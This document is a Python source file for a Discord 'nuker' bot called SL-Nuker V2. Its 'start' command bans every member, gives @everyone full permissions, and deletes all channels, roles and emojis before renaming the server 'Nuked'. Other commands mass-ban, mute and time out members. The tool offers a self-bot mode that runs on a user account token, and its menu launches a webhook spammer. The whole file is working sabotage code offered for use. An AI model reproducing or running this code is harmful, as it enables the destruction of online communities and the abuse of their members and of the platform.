channel_names = ["."]
server_name = "Nuked"

import os, random, json, time, sys, discord, requests, datetime, aiohttp
from venv import create
from pystyle import Anime, Colorate, Colors, Center, System, Write, Box
from discord.ext import commands

banner = f'''Loading
 _____ __       _____     _           
|   __|  |     |   | |_ _| |_ ___ ___ 
|__   |  |__   | | | | | | '_| -_|  _|
|_____|_____|  |_|___|___|_,_|___|_|

Hello {os.getlogin()}
Select your data file to proceed

'''

banner2 = '''


 _____ __       _____     _           
|   __|  |     |   | |_ _| |_ ___ ___ 
|__   |  |__   | | | | | | '_| -_|  _|
|_____|_____|  |_|___|___|_,_|___|_|
'''

options = f'''Options
1)Start bot
2)Tools
3)Commands list
'''

def get_commands():
    if os.path.exists("Files") and os.path.isfile("Files\\Commands.txt"):
        with open("Files\\Commands.txt", "r") as f:
            Write.Print(f, Colors.green_to_white, interval=0.001)

def tools():
    vertical_bar = chr(124)
    tools_list = f"1 > Coffee | Webhook Spammer "
    tool = ["Coffee.py"]
    Write.Print(tools_list, Colors.green_to_white, interval=0.01)
    option = Write.Input("\nOption > ", Colors.white_to_green, interval=0.03)
    if option == "exit":
        menu()
    else:
        os.system(f"python Tools/{tool[int(option) - 1]}")

data_inSession = ""

def set_dataInSession():
    if os.path.isfile("setup.bat"):
        os.remove("setup.bat")
        os.remove("Files/requirements.txt")
    Write.Print(banner, Colors.purple_to_red, interval=0.001)
    datas = []
    for index, filename in enumerate(os.listdir("Data")):
            f = os.path.join("Data",filename)
            if os.path.isfile(f):
                Write.Print(str(index + 1)+")"+filename+"\n", Colors.green_to_white, interval=0.03)
                datas.append(filename)

    if len(datas) == 0:
        Write.Print("You dont have any data file!", Colors.green_to_white, interval=0.03)
        Write.Print("Generate a data file in https://sl-nuker.slbr.repl.co/data.html")
        time.sleep(5)
    else:
        global data_inSession
        data_inSession = datas[int(Write.Input("\nData > ", Colors.white_to_green, interval=0.03)) - 1]
        return get_data()

def get_data():
    if os.path.exists("Data") and os.path.isfile(f"Data\\{data_inSession}") and os.path.getsize(f"Data\\{data_inSession}") > 0:
        with open(f"Data\\{data_inSession}", "r", encoding="utf8") as f:
            data = json.load(f)
            webhook = data["webhook"]
            token = data["token"]
            prefix = data["prefix"]
            owner_name = data["owner_name"]
            log_method = data["log_method"]
            self_bot = data["self_bot"]
            if bool(token) and bool(prefix) and bool(webhook) == True:
                # 0 > webhook
                # 1 > token
                # 2 > prefix
                # 3 > owner_name
                # 4 > log_method 
                # 5 > self_bot
                return webhook, token, prefix, owner_name, log_method, self_bot
            else:
                print(Colorate.DiagonalBackwards(Colors.green_to_purple, "[+] Some value is empty", 1))
    else:
        return set_dataInSession()

intents = discord.Intents.default()
intents.members = True

nuker = commands.Bot(intents=intents, command_prefix=get_data()[2], canse_insensitive=True, self_bot=get_data()[5])
nuker.remove_command('help')

def ws(name, value):
    desc = f"**{name}:**\n {value}"
    content = {
        "content": "",
        "embeds": [
            {
            "title": "New Log:",
            "description": desc,
            "color": 13041664,
            "footer": {
                "text": "https://bit.ly/38iFHdS",
                "icon_url": "https://upload.wikimedia.org/wikipedia/commons/b/b4/Devil-goat.jpg"
            }
            }
        ],
        "username": "SL-Nuker Log",
        "avatar_url": "https://cdn.discordapp.com/attachments/864963459242000444/970408018149789716/cranio-de-satan-com-ilustracao-de-chifre-perfeito-para-design-de-camisetas-roupas-ou-mercadorias_467580-211.webp",
        "attachments": []
    }
    r = requests.post(get_data()[0], data=json.dumps(content), headers={'Content-Type':'application/json'})

def create_log(title, value):
    lt = time.strftime('%H:%M:%S', time.localtime())
    log_method = get_data()[4]
    match log_method:
        case "file":
            structure = f"{title.upper()} | ({lt}) | {value}"
            with open("Logs\\log.log","a",encoding="utf-8") as fd:
                fd.write(f"\n{structure}")
        case "discord":
            ws(title.upper(), value)
        case "console":
            structure_console = f"[{lt}] | {title.upper()} > {value}"
            print(Colorate.DiagonalBackwards(Colors.green_to_white, structure_console, 1))
        case _:
            Write.Print("[?] Unknown log method")

# Nuker events

@nuker.event
async def on_ready():
    System.Clear()
    print(Colorate.DiagonalBackwards(Colors.green_to_white, Center.XCenter(banner2), 1))
    print("")
    Write.Print(f"[+] Logged as {nuker.user}\n", Colors.green_to_white, interval=0.01)
    if not get_data()[5]:
        Write.Print(f"[+] Nuker Invite: https://discord.com/oauth2/authorize?client_id={nuker.user.id}&scope=bot&permissions=8", Colors.green_to_white, interval=0.01)
    print("")
    create_log("[+]Status",f"Online - Logged as {nuker.user}")

@nuker.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.message.delete()
        create_log("[!]Warning","This command doesn't exist!")
    elif isinstance(error, commands.BotMissingPermissions):
        create_log("[!]Warning","Missing permission")

@nuker.event
async def on_guild_join(guild):
    create_log("[!]Log",f"{guild} Nuker is added")

# Nuker commands

@nuker.command()
async def help(ctx):
    await ctx.message.delete()

@nuker.command()
async def stop(ctx):
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        await ctx.bot.logout()
        menu()
    else:
        create_log("[!]Log","Command not executed")

@nuker.command()
async def start(ctx):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        confirmation = input("(Confirmation) Do you really want to use this command? [Y/N]: ").lower()
        if confirmation.startswith("y"):
            create_log("[!]Exect", "start")
            create_log("[!]Stage","Ban all members")
            for member in ctx.guild.members:
                try:
                    if str(member) not in get_data()[3]:
                        await member.ban()
                        create_log("[!]Log",f"Member {member.name}#{member.discriminator} was banned")
                except Exception as e:
                    create_log("[!]Log",f"It was not possible to ban {member.name}#{member.discriminator}")
            create_log("[!]Stage","Give Everyone permissions")
            try:
                role = discord.utils.get(ctx.guild.roles, name="@everyone")
                await role.edit(permissions = discord.Permissions.all())
                create_log("[!]Log","Permissions given to everyone")
            except Exception as e:
                create_log("[!]Log","Unable to give permission to everyone")
            create_log("[!]Stage","Delete all channels")
            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                    create_log("[!]Log",f"{channel.name} channel has been deleted")
                except Exception as e:
                    create_log(f"[!]Log",f"{channel.name} could not be deleted!")
            create_log("[!]Stage","change server name!")
            try:
                await ctx.guild.edit(name=server_name)
                create_log("Name changed!")
            except Exception as e:
                create_log("[!]Error",f"The server has not been renamed to {server_name}")
            create_log("[!]Stage","Create new channels")
            #  change range(1,to whatever do you want)
            #  The default is 2, this will create 1 channel
            for i in range(1,1):
                try:
                    channel_name = random.choice(channel_names)
                    channel_name = channel_name.replace(" ","-")
                    await ctx.guild.create_text_channel(channel_name)
                    create_log("[!]Exect",f"{channel.name} channel has been created")
                except Exception as e:
                    create_log("[!]Error",f"it was not possible to create the channel {channel_name}")
            create_log("[!]Stage","Create new invites")
            for channel in ctx.guild.text_channels:
                try:
                    link = await channel.create_invite(max_age = 0, max_uses = 0)
                    create_log("[!]Log",f"New invite {link}")
                except Exception as e: 
                    create_log("[!]Error","Unable to create a new invite")
            create_log("[!]Stage","Delete all emojis")
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    create_log("[!]Log",f"Emoji {emoji.name} it has been deleted")
                except Exception as e:
                    create_log("[!]Log",f"Emoji {emoji.name} not deleted!")
            create_log("[!]Stage","Delete all Roles")
            for role in ctx.guild.roles:
                try:
                    await role.delete()
                    create_log("[!]Log",f"Role {role} it has been deleted")
                except Exception as e:
                    create_log("[!]Log",f"Role {role} not deleted!")

@nuker.command()
async def slist(ctx):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        create_log("[!]Log","Loading All Servers")
        for guild in nuker.guilds:
            create_log("[!]Server",f"{guild.name} - {len(guild.members)} Members")

@nuker.command()
async def mute_everyone(ctx):
    for member in ctx.guild.members:
        try:
            if str(member) not in get_data()[3]:
                await member.edit(mute = True)
                create_log("[!]Log",f"Member {member.name}#{member.discriminator} was muted")
        except Exception as e:
            print(e)
            create_log("[!]Log",f"It was not possible to mute {member.name}#{member.discriminator}")

@nuker.command()
async def timeout_everyone(ctx):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        for member in ctx.guild.members:
            try:
                if str(member) not in get_data()[3]:
                    time = datetime.datetime.now() + datetime.timedelta(days=7)
                    await member.edit(time_out_until=time)
            except Exception as e:
                create_log("[!]Log",f"It was not possible to timeout {member.name}#{member.discriminator} {e}")
    

@nuker.command()
async def edel(ctx):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                create_log("[!]Log",f"Emoji {emoji.name} it has been deleted")
            except Exception as e:
                create_log("[!]Log",f"Emoji {emoji.name} not deleted!")

@nuker.command()
async def cdel(ctx):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                create_log("[!]Log",f"{channel.name} channel has been deleted")
            except Exception as e:
                create_log("[!]Error",f"Unable to delete channel {channel.name}")

@nuker.command()
async def ccr(ctx, channel_name, limit=1):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        for i in range(1,limit+1):
            try:
                channel_name = channel_name
                await ctx.guild.create_text_channel(channel_name)
                create_log("[!]Log","Channel created")
            except Exception as e:
                create_log("[!]Log","Unable to create channel")
    
@nuker.command()
async def cinv(ctx):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    channel = ctx.message.channel
    if str(user) in get_data()[3]:
        try:
            invite = await channel.create_invite(max_age=0, max_uses=0)
            create_log("[!]Log",f"New Invite {invite}")
        except Exception as e:
            create_log("[!]","Unable to create a new invite")

@nuker.command()
async def unban(ctx, *, user : discord.User):
    await ctx.message.delete()
    guild = ctx.guild
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        try:
            await guild.unban(user=user)
            create_log("[!]Log",f"{user} has been unbanned")
        except Exception as e:
            create_log("[!]Log",f"Unable to unban {user}")

@nuker.command()
async def ban(ctx, member : discord.Member, *, reason=None):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        try:
            await member.ban(reason=reason)
            create_log("[!]Log",f"{member} has been banned")
        except Exception as e:
            create_log("[!]Log",f"It was not possible to ban {member}")

@nuker.command()
async def rdel(ctx):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        for role in ctx.guild.roles:
            try:
                await role.delete()
                create_log("[!]Log",f"{role} has been deleted")
            except Exception as e:
                create_log("[!]Log",f"{role} was not deleted")

@nuker.command()
async def banall(ctx):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        for member in ctx.guild.members:
            try:
                if str(member) not in get_data()[3]:
                    await member.ban(reason=None)
                    create_log("[!]Log",f"{member} has been banned")
            except Exception as e:
                create_log("[!]Log",f"It was not possible to ban {member}")

@nuker.command()
async def unbanall(ctx):
    await ctx.message.delete()
    banned_user = await ctx.guild.bans()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        for ban_entry in banned_user:
            user = ban_entry.user
            try:
                await ctx.guild.unban(user)
                create_log("[!]Log",f"{user} has been unbanned")
            except Exception as e:
                create_log("[!]Log",f"Unable to unban {user}")

#sname 
@nuker.command()
async def sname(ctx, *, args):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        try:
            await ctx.guild.edit(name=args)
            create_log("[!]",f"Server name has been change to {args}")
        except Exception as e:
            create_log("[!]",f"Unable to change the server name to {args}")

#eperm
@nuker.command()
async def eperm(ctx):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        try:
            role = discord.utils.get(ctx.guild.roles, name = "@everyone")
            await role.edit(permissions = discord.Permissions.all())
            create_log("[!]Log","Everyone role permissions changed")
        except Exception as e:
            create_log("[!]Log","Unable to change Everyone role permissions")

@nuker.command()
async def adrole(ctx, user: discord.Member, role: discord.Role):
    await ctx.message.delete()
    userw = await nuker.fetch_user(ctx.author.id)
    if str(userw) in get_data()[3]:
        try:
            await user.add_roles(role)
            create_log("[!]Log",f"Added {role.name} to {str(user)}")
        except Exception as e:
            print(e)
            create_log("[!]Log","Unable to give the role")

@nuker.command()
async def drole(ctx, role: discord.Role):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        try:
            await role.delete()
            create_log("[!]Log",f"Role {role} it has been deleted")
        except Exception as e:
            create_log("[!]Log",f"Role {role} not deleted!")

@nuker.command()
async def crole(ctx, role_name):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        guild = ctx.guild
        await guild.create_role(name=role_name, permissions=discord.Permissions.all())

@nuker.command()
async def clear_logs(ctx):
    await ctx.message.delete()
    user = await nuker.fetch_user(ctx.author.id)
    if str(user) in get_data()[3]:
        System.Clear()
        print(Colorate.DiagonalBackwards(Colors.green_to_white, Center.XCenter(banner2), 1))
        print("")
        Write.Print(f"[+] Logged as {nuker.user}\n", Colors.green_to_white, interval=0.01)
        if not get_data()[5]:
            Write.Print(f"[+] Nuker Invite: https://discord.com/oauth2/authorize?client_id={nuker.user.id}&scope=bot&permissions=8", Colors.green_to_white, interval=0.01)
        print("")
        create_log("[+]Status",f"Online - Logged as {nuker.user}")
        
def start_bot():
    self_bot = get_data()[5]
    text = "[+] Turning bot ON"
    if self_bot:
        text = "[+] Turning Self Bot ON"
    try:
        Write.Print(text, Colors.white_to_green, interval=0.03)
        nuker.run(get_data()[1], bot= not self_bot)
    except Exception as e:
        if str(e) == "Improper token has been passed.":
            System.Clear()
            print(Colorate.DiagonalBackwards(Colors.green_to_white, Center.XCenter(banner2), 1))
            print(Colorate.DiagonalBackwards(Colors.green_to_white, "[+] Improper token has been passed.", 1))
        else:
            print(Colors.red+f"Unregistered error send to Support")
            print(e)


def menu():
    System.Title("SL-Nuker V2")
    System.Size(110, 30)
    System.Clear()
    print(Colors.green+f"Data set successfully [{data_inSession}]")
    print(Colorate.DiagonalBackwards(Colors.green_to_white, Center.XCenter(banner2), 1))
    print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter(Box.DoubleCube("Credits > slx#6656 | Follow me in TikTok > @silencebr | Github > slx10"))))
    print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter(Box.DoubleCube(options))))
    not_yet = False
    while not not_yet:
        print("")
        option = Write.Input("Option > ", Colors.white_to_green, interval=0.03)
        match option:
            case "1":
                start_bot()
                break
            case "2":
                tools()
            case "3":
                get_commands()

if __name__ == '__main__':
    menu()
